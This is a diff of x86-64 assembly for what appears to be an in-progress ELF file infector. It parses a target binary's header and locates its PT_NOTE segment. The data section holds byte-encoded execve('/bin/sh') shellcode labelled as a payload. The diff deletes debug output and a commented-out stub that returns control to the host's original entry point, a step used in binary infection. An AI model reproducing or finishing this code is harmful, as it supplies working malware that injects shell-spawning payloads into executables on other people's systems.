@@ -4,17 +4,8 @@ section .data
   error_msg db "Il y a un probleme", 0xA ; Message when e_entry matches
   error_msg_len equ $ - error_msg           ; Length of the match message
 
-  match_msg db "Entry Point Match", 0xA ; Message when e_entry matches
-  match_len equ $ - match_msg           ; Length of the match message
-
-  matchPHNUM_msg db "PHNUM Match", 0xA ; Message when e_entry matches
-  matchPHNUM_len equ $ - matchPHNUM_msg           ; Length of the match message
-
   note_msg db "PT_NOTE segment FOUND", 0xA ; Message to print
   note_len equ $ - note_msg         ; Message length
-
-  headerMessage db "Im in a PH segment", 0xA ; Message to print
-  headerMessagelen equ $ - headerMessage         ; Message length
 
   payload_message db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
   payload_msg_len equ $ - payload_message
@@ -31,9 +22,6 @@ fd resq 1                              ; File descriptor
 p_offset: resb 8
 p_vaddr: resb 8 
 p_filesz: resb 8
-payload_virtual_address: resb 8
-payload_rip_position: resb 8
-payload_base_offset: resb 8
 statbuf resb 144                  ; reserve space for the stat struct
 fsize resq 1                      ; Reserve 8 bytes to store the file size (64-bit value)
 
@@ -44,34 +32,13 @@ _start:
   call read_file
   call check_ELF_file
   call save_Important_field_ELF_Header
-  call compare_entry_point
-  ;call compare_e_phnum
   call find_PT_NOTE
-  call write_output
 
   ; Finish the execution successfully
   mov rax, 60           ; syscall number for 'exit'
   xor rdi, rdi          ; exit code 0 (success)
   syscall
 
-;payload:
-;    ; Print the message
-;    mov rax, 1                        ; syscall: write
-;    mov rdi, 1                        ; stdout
-;    lea rsi, [rel payload_message]    ; Address of the message
-;    mov rdx, payload_msg_len          ; Message length
-;    syscall
-;
-;    ; Calculate the runtime base address
-;    lea rax, [rel payload]                    ; Load current instruction pointer
-;    sub rax, payload_base_offset      ; Subtract offset to determine base address
-;
-;    ; Jump to the original entry point
-;    mov rbx, qword [rax + e_entry_point] ; Load original entry point
-;    jmp rbx                           ; Jump to original entry point
-;    ;; Jump to original entry point
-;    ;jmp qword [e_entry_point]         ; Jump to saved original entry point
-;
 error:
   ; Handle errors (exit with code 1 if something goes wrong)
   ; Print error Message
@@ -168,40 +135,6 @@ save_Important_field_ELF_Header:
   mov word [e_phnum], ax          ; Save it to the `e_phnum` variable
 
   ret                             ; Return to the caller
-
-
-compare_entry_point:
-  ; Compare the saved e_entry_point with a hardcoded value (e.g., 0x5130)
-  mov rax, qword [e_entry_point] ; Load the saved e_entry_point
-  cmp rax, 0x5130               ; Compare it with the expected value
-  je entry_point_match          ; If equal, jump to match label
-
-compare_e_phnum:
-    movzx rax, word [e_phnum]   ; Load e_phnum (2 bytes) into RAX, zero-extend it
-    cmp rax, 13                ; Compare with 13 (0x0D)
-    ;je e_phnum_match            ; If equal, jump to match label
-
-  ret
-
-entry_point_match:
-  ; Do something when entry point matches
-  ; For example, print "Entry Point Match"
-  mov rax, 1                    ; syscall: write
-  mov rdi, 1                    ; stdout
-  lea rsi, [match_msg]          ; Pointer to the "Match" message
-  mov rdx, match_len            ; Length of the message
-  syscall
-  ret
-
-e_phnum_match:
-  ; Do something when entry point matches
-  ; For example, print "Entry Point Match"
-  mov rax, 1                    ; syscall: write
-  mov rdi, 1                    ; stdout
-  lea rsi, [matchPHNUM_msg]          ; Pointer to the "Match" message
-  mov rdx, matchPHNUM_len            ; Length of the message
-  syscall
-  ret
 
 ; -----------------------------
 ; Function: find_PT_NOTE
@@ -388,46 +321,3 @@ read_at_offset:
   pop r11                           ; Restore r10 and r11
   pop r10
   ret
-; -----------------------------
-; Function: write_output
-; This function writes the content of the buffer to the standard output (stdout).
-; It uses the 'write' syscall to display the data on the terminal.
-; -----------------------------
-write_output:
-  ; Write the buffer content to stdout
-  mov rax, 1            ; syscall number for 'write'
-  mov rdi, 1            ; file descriptor for stdout (1)
-  mov rsi, ELF_Header       ; buffer containing the data to write
-  mov rdx, 4            ; number of bytes to write (4 bytes)
-  syscall
-
-  ; Write the saved entry point for debugging
-  ;mov rax, 1              ; syscall: write
-  ;mov rdi, 1              ; stdout
-  ;lea rsi, [e_entry_point] ; Pointer to entry point
-  ;mov rdx, 8              ; Write 8 bytes
-  ;syscall
-
-; Write the saved entry point for debugging
-  ;mov rax, 1              ; syscall: write
-  ;mov rdi, 1              ; stdout
-  ;lea rsi, [e_phoff] ; Pointer to entry point
-  ;mov rdx, 8              ; Write 8 bytes
-  ;syscall
-
-; Write the saved entry point for debugging
-  mov rax, 1              ; syscall: write
-  mov rdi, 1              ; stdout
-  lea rsi, [e_phentsize] ; Pointer to entry point
-  mov rdx, 2              ; Write 8 bytes
-  syscall
-
-; Write the saved entry point for debugging
-  mov rax, 1              ; syscall: write
-  mov rdi, 1              ; stdout
-  lea rsi, [e_phnum] ; Pointer to entry point
-  mov rdx, 2              ; Write 8 bytes
-  syscall
-
-  ret                   ; return to caller
-
